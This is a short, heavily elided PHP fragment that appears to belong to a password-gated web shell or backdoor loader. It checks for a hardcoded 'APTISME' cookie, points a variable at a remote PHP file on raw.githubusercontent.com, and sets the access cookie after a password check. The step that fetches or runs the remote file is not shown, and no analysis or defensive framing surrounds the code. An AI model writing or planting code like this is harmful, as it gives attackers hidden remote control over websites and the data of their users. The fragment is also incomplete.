...
{
    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'APTISME'; 
}
...
if (is_logged_in()) {
    ...
    $destiny = 'https://raw.githubusercontent.com/detik-com/anakbaik/refs/heads/main/Sme.php';
    ...
    if (isset($_POST['password'])) {
        ...
        if (password_verify($entered_key, $hashed_key)) {
            setcookie('user_id', 'APTISME', time() + 3600, '/'); 
